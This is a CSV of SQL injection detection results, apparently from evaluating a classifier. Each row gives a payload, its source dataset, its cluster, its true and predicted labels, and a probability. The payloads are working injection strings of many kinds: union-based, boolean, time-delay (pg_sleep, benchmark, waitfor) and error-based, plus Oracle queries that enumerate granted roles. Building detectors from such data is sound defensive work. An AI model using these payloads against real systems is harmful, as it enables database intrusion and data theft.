text,source,fuzzy_cluster_id,true_label,pred_label,prob_sqli,correct
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,251,1,1,0.9999922513961792,1
"select * from users where id  =  1 + @<1# union select 1,version  (    )   -- 1",sajid576/sql-injection-dataset,468,1,1,0.9999945163726807,1
or a   =   a,sajid576/sql-injection-dataset,228,1,1,0.9999940395355225,1
or a  =  a--,sajid576/sql-injection-dataset,478,1,1,0.9999934434890747,1
"||  (  elt  (  -3+5,bin  (  15  )  ,ord  (  10  )  ,hex  (  char  (  45   )    )      )    )",sajid576/sql-injection-dataset,491,1,1,0.9999945163726807,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,251,1,1,0.9999918937683105,1
(  sqlattempt2  ),sajid576/sql-injection-dataset,500,1,1,0.999993085861206,1
x' and email is NULL; --,sajid576/sql-injection-dataset,337,1,1,0.999993085861206,1
"""   )    )   ;waitfor delay '0:0:__TIME__'--",sajid576/sql-injection-dataset,114,1,1,0.9999942779541016,1
select * from users where id  =  1 +  (  \  )   or 1  =  1 -- 1,sajid576/sql-injection-dataset,510,1,1,0.9999943971633911,1
"select * from users where id  =  1 or @#""  (    =  1 union select 1,version  (    )   -- 1",sajid576/sql-injection-dataset,524,1,1,0.9999945163726807,1
"admin""  )   or   (  ""1""  =  ""1""/*",sajid576/sql-injection-dataset,525,1,1,0.9999946355819702,1
"select * from users where id  =  1 or 1#""$ union select 'a',version  (    )   -- 1",sajid576/sql-injection-dataset,534,1,1,0.9999946355819702,1
hi' or 'a'  =  'a,sajid576/sql-injection-dataset,537,1,1,0.9999943971633911,1
"select * from users where id  =  '1' *1 union select 1,banner from v$version where rownum  =  1 -- 1'",sajid576/sql-injection-dataset,541,1,1,0.9999942779541016,1
order by,sajid576/sql-injection-dataset,551,1,0,0.0009641414508223534,0
1 exec sp_   (  or exec xp_  ),sajid576/sql-injection-dataset,565,1,1,0.9999945163726807,1
"select * from users where id  =  1 union select 1a#,banner from v$version where rownum  =  1 -- 1",sajid576/sql-injection-dataset,578,1,1,0.9999942779541016,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,251,1,1,0.9999922513961792,1
"select * from users where id  =  1 or ""{%"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,582,1,1,0.9999943971633911,1
"-4860'  )   as azyx where 6901  =  6901 union all select 6901,6901,6901,6901,6901#",sajid576/sql-injection-dataset,591,1,1,0.9999945163726807,1
"1""   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",sajid576/sql-injection-dataset,602,1,1,0.9999946355819702,1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""pawh""  =  ""pawh",sajid576/sql-injection-dataset,617,1,1,0.9999943971633911,1
"-7868""   )    )    or 9323  =  9323#",sajid576/sql-injection-dataset,630,1,1,0.9999946355819702,1
-5742' where 1314  =  1314 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,sajid576/sql-injection-dataset,640,1,1,0.9999946355819702,1
"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",sajid576/sql-injection-dataset,645,1,1,0.9999946355819702,1
1'  )   where 4867  =  4867 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,sajid576/sql-injection-dataset,659,1,1,0.9999946355819702,1
"1'+  (  select syrz where 7699  =  7699 union all select null,null,null#",sajid576/sql-injection-dataset,668,1,1,0.9999945163726807,1
"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd",sajid576/sql-injection-dataset,674,1,1,0.9999947547912598,1
"1""   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",sajid576/sql-injection-dataset,686,1,1,0.9999946355819702,1
"1'||  (  select 'kojx' from dual where 8140  =  8140 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",sajid576/sql-injection-dataset,703,1,1,0.9999946355819702,1
1'  )   where 2753  =  2753 and   (  2739  =  8047  )  *8047--,sajid576/sql-injection-dataset,712,1,1,0.9999947547912598,1
1'  )   as llug where 2244  =  2244 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,sajid576/sql-injection-dataset,716,1,1,0.9999946355819702,1
"1'+  (  select 'sbvh' where 8539  =  8539 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   +'",sajid576/sql-injection-dataset,728,1,1,0.9999947547912598,1
"1 where 1096  =  1096 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",sajid576/sql-injection-dataset,733,1,1,0.9999945163726807,1
"1'   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'acly' like 'acly",sajid576/sql-injection-dataset,752,1,1,0.9999942779541016,1
"1',  (  select   (  case when   (  2106  =  2106  )   then   (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   else 2106*  (  select 2106 from master..sysdatabases  )   end   )    )",sajid576/sql-injection-dataset,763,1,1,0.9999946355819702,1
"1""  )   and   (  3020  =  3020  )  *6703 and   (  ""hkjf""  =  ""hkjf",sajid576/sql-injection-dataset,768,1,1,0.9999946355819702,1
"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",sajid576/sql-injection-dataset,776,1,1,0.9999946355819702,1
"1   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",sajid576/sql-injection-dataset,787,1,1,0.999994158744812,1
"-4076'   )    )    union all select 9030,9030,9030,9030,9030,9030,9030,9030,9030,9030--",sajid576/sql-injection-dataset,801,1,1,0.9999945163726807,1
"1%' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and '%'  =  '",sajid576/sql-injection-dataset,814,1,1,0.9999946355819702,1
"-8893%'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   '%'  =  '",sajid576/sql-injection-dataset,824,1,1,0.9999945163726807,1
"1""   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sajid576/sql-injection-dataset,834,1,1,0.9999943971633911,1
"select count  (  *  )   from generate_series  (  1,5000000  )  #",sajid576/sql-injection-dataset,839,1,1,0.999992847442627,1
"1%"" union all select null,null,null,null,null#",sajid576/sql-injection-dataset,848,1,1,0.9999939203262329,1
"-3349   )    )     )   union all select 6553,6553#",sajid576/sql-injection-dataset,860,1,1,0.9999945163726807,1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  '%'  =  '",sajid576/sql-injection-dataset,866,1,1,0.999994158744812,1
"1'   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sajid576/sql-injection-dataset,834,1,1,0.9999943971633911,1
"-9286""   )    )    as mfxl where 9348  =  9348 union all select 9348#",sajid576/sql-injection-dataset,873,1,1,0.9999946355819702,1
"-1963 union all select 6831,6831,6831,6831,6831,6831,6831,6831#",sajid576/sql-injection-dataset,886,1,1,0.9999939203262329,1
"1%' and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sajid576/sql-injection-dataset,834,1,1,0.9999942779541016,1
"1,exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  7759  =  7759,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )",sajid576/sql-injection-dataset,897,1,1,0.9999942779541016,1
"1"" where 4345  =  4345 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",sajid576/sql-injection-dataset,902,1,1,0.9999946355819702,1
"1'  )   as ywtu where 3009  =  3009 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sajid576/sql-injection-dataset,913,1,1,0.9999946355819702,1
-6200%'   )    )    or 8077  =  4661,sajid576/sql-injection-dataset,923,1,1,0.9999945163726807,1
"-9958""  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#",sajid576/sql-injection-dataset,936,1,1,0.9999946355819702,1
"1""  )   union all select null#",sajid576/sql-injection-dataset,947,1,1,0.9999945163726807,1
"1""   )    )    as frsd where 6475  =  6475 union all select null,null,null,null,null,null,null,null,null,null--",sajid576/sql-injection-dataset,958,1,1,0.9999945163726807,1
"-3853""  )   where 4626  =  4626 union all select 4626,4626,4626--",sajid576/sql-injection-dataset,969,1,1,0.9999946355819702,1
"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar",sajid576/sql-injection-dataset,971,1,1,0.9999946355819702,1
1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,sajid576/sql-injection-dataset,645,1,1,0.9999945163726807,1
"1'   )    )    as xntz where 5801  =  5801 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",sajid576/sql-injection-dataset,982,1,1,0.9999946355819702,1
"1"" union all select null,null,null,null--",sajid576/sql-injection-dataset,996,1,1,0.999994158744812,1
1  )   as mtda where 3951  =  3951,sajid576/sql-injection-dataset,1006,1,1,0.9999946355819702,1
1  )   where 7026  =  7026,sajid576/sql-injection-dataset,1019,1,1,0.9999946355819702,1
"-6388'+  (  select 'jqld' where 8600  =  8600 union all select 8600,8600#",sajid576/sql-injection-dataset,1020,1,1,0.9999945163726807,1
"1'||  (  select 'epjf' from dual where 8584  =  8584 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sajid576/sql-injection-dataset,1032,1,1,0.9999947547912598,1
"-1083'  )   union all select 9993,9993,9993,9993,9993,9993,9993,9993,9993--",sajid576/sql-injection-dataset,1046,1,1,0.9999945163726807,1
1'||  (  select 'gved' from dual where 6965  =  6965,sajid576/sql-injection-dataset,1055,1,1,0.9999945163726807,1
"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",sajid576/sql-injection-dataset,1061,1,1,0.999994158744812,1
"1  )   where 1443  =  1443 union all select null,null,null,null,null#",sajid576/sql-injection-dataset,1077,1,1,0.9999945163726807,1
select   (  case when   (  7217  =  7631  )   then 7217 else 7217*  (  select 7217 from information_schema.character_sets  )   end  )  #,sajid576/sql-injection-dataset,1089,1,1,0.9999940395355225,1
select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,sajid576/sql-injection-dataset,1090,1,1,0.9999943971633911,1
1%'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   '%'  =  ',sajid576/sql-injection-dataset,1104,1,1,0.9999945163726807,1
"1""  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""rrbl""  =  ""rrbl",sajid576/sql-injection-dataset,1116,1,1,0.9999947547912598,1
"1"" where 3678  =  3678 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",sajid576/sql-injection-dataset,1127,1,1,0.9999946355819702,1
"1'+  (  select 'arzm' where 6464  =  6464 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  +'",sajid576/sql-injection-dataset,1135,1,1,0.9999946355819702,1
"1""   )    )    as ljhz where 2416  =  2416",sajid576/sql-injection-dataset,1141,1,1,0.9999946355819702,1
"1  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sajid576/sql-injection-dataset,834,1,1,0.999994158744812,1
"1  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  8898  =  8898",sajid576/sql-injection-dataset,1150,1,1,0.9999947547912598,1
1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,sajid576/sql-injection-dataset,1161,1,1,0.9999946355819702,1
select sleep  (  5  )   and   (  'dcys' like 'dcys,sajid576/sql-injection-dataset,1169,1,1,0.9999946355819702,1
"-9934""  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""xecb"" like ""xecb",sajid576/sql-injection-dataset,1183,1,1,0.9999947547912598,1
select pg_sleep  (  5  )  -- ojzt,sajid576/sql-injection-dataset,1190,1,1,0.9999939203262329,1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'gfpd'  =  'gfpd",sajid576/sql-injection-dataset,1199,1,1,0.999994158744812,1
"1""   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  ""enfu""  =  ""enfu",sajid576/sql-injection-dataset,1213,1,1,0.9999946355819702,1
1 order by 1--,sajid576/sql-injection-dataset,1227,1,1,0.9999909400939941,1
select   (  case when   (  8820  =  4648  )   then 8820 else 8820*  (  select 8820 from information_schema.character_sets  )   end  )  #,sajid576/sql-injection-dataset,1228,1,1,0.999994158744812,1
"1""   )    )    as ltco where 3862  =  3862 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,1243,1,1,0.9999947547912598,1
"-2378"" where 2686  =  2686 or 6872  =  6872--",sajid576/sql-injection-dataset,1259,1,1,0.9999946355819702,1
"select count  (  *  )   from generate_series  (  1,5000000  )  --",sajid576/sql-injection-dataset,839,1,1,0.9999935626983643,1
"1""  )   where 6478  =  6478 union all select null,null,null,null,null,null#",sajid576/sql-injection-dataset,1264,1,1,0.9999946355819702,1
"-1269' or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'gohv' like 'gohv",sajid576/sql-injection-dataset,1274,1,1,0.9999945163726807,1
"-9558"" where 7497  =  7497 or   (  2539  =  6484  )  *6484--",sajid576/sql-injection-dataset,1281,1,1,0.9999946355819702,1
"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",sajid576/sql-injection-dataset,1291,1,1,0.9999946355819702,1
1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  -- ybmz,sajid576/sql-injection-dataset,1304,1,1,0.9999946355819702,1
1%'   )    )     )   order by 1#,sajid576/sql-injection-dataset,1309,1,1,0.9999942779541016,1
"1%""   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",sajid576/sql-injection-dataset,645,1,1,0.9999946355819702,1
1%'   )    )     )   and 1661  =  7683,sajid576/sql-injection-dataset,1328,1,1,0.9999945163726807,1
"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",sajid576/sql-injection-dataset,1331,1,1,0.9999946355819702,1
select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',sajid576/sql-injection-dataset,1345,1,1,0.999994158744812,1
-2100' where 9260  =  9260 or 3038  =  3038,sajid576/sql-injection-dataset,1357,1,1,0.9999943971633911,1
"1   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  7484  =  7484",sajid576/sql-injection-dataset,1367,1,1,0.9999942779541016,1
"1%"" union all select null,null,null,null,null,null,null#",sajid576/sql-injection-dataset,848,1,1,0.9999939203262329,1
"1'  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,1371,1,1,0.9999946355819702,1
"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",sajid576/sql-injection-dataset,1383,1,1,0.9999946355819702,1
"-4546'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )",sajid576/sql-injection-dataset,1397,1,1,0.9999947547912598,1
1' where 4460  =  4460,sajid576/sql-injection-dataset,1410,1,1,0.9999943971633911,1
1'   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'hgtg'  =  'hgtg,sajid576/sql-injection-dataset,1413,1,1,0.9999947547912598,1
"-6754'  )   where 8388  =  8388 union all select 8388,8388,8388,8388,8388--",sajid576/sql-injection-dataset,1418,1,1,0.9999946355819702,1
"1%' union all select null,null,null,null,null#",sajid576/sql-injection-dataset,1437,1,1,0.9999942779541016,1
"-4592""   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   ""xvpz""  =  ""xvpz",sajid576/sql-injection-dataset,1446,1,1,0.9999947547912598,1
1' where 6116  =  6116,sajid576/sql-injection-dataset,1459,1,1,0.9999943971633911,1
